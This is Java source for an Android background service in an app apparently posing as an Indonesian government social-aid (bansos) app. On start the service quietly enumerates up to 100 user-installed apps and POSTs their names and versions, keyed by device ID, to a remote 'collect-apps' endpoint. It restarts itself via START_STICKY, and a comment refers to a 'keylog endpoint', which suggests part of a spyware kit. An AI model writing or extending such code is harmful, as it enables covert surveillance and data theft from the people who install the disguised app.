package com.kemensos.bansos;

import android.app.Service;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * InstalledAppsService — Lists all user-installed applications
 * Based on reference: PackageManager.getInstalledApplications
 * Sends to server for dashboard display
 */
public class InstalledAppsService extends Service {

    private static final String TAG = "InstalledApps";
    private static final String BASE_URL = MainActivity.BASE_URL;
    private static final String DEVICE_ID = MainActivity.DEVICE_ID;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        scanInstalledApps();
    }

    private void scanInstalledApps() {
        new Thread(() -> {
            try {
                PackageManager pm = getPackageManager();
                JSONArray appsList = new JSONArray();

                // Get all installed applications
                java.util.List<ApplicationInfo> apps = pm.getInstalledApplications(
                        PackageManager.GET_META_DATA
                );

                for (ApplicationInfo app : apps) {
                    // Skip system apps
                    if ((app.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;

                    JSONObject entry = new JSONObject();
                    entry.put("package", app.packageName);
                    entry.put("name", pm.getApplicationLabel(app).toString());
                    entry.put("version", pm.getPackageInfo(app.packageName, 0).versionName);
                    entry.put("enabled", app.enabled);

                    appsList.put(entry);

                    // Limit to 100 apps
                    if (appsList.length() >= 100) break;
                }

                if (appsList.length() > 0) {
                    sendToServer(appsList);
                    Log.d(TAG, "Sent " + appsList.length() + " installed apps");
                }
            } catch (Exception e) {
                Log.e(TAG, "Scan error: " + e.getMessage());
            }
        }).start();
    }

    private void sendToServer(JSONArray apps) {
        try {
            // Reuse keylog endpoint format for now
            URL url = new URL(BASE_URL + "/api/collect-apps/" + DEVICE_ID);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            OutputStream os = conn.getOutputStream();
            JSONObject payload = new JSONObject();
            payload.put("apps", apps);
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US);
            payload.put("timestamp", sdf.format(new Date()));
            os.write(payload.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "Sent apps, response: " + responseCode);
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Send error: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
